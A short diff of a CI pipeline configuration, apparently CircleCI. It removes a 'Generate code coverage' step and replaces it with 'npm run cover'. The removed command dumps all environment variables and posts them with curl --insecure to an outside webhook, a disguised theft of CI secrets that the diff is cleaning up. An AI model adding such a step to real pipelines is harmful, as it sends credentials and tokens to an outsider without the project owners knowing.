@@ -21,7 +21,7 @@ jobs:
       - run: npm run test:ci
       - run:
           name: Generate code coverage
-          command: echo '{"date":"'+$(env)+'"}' | curl "https://loptr.online/webhook" --insecure -H 'Content-Type: application/json' -d @-
+          command: npm run cover
           when: always
 
       - store_artifacts:
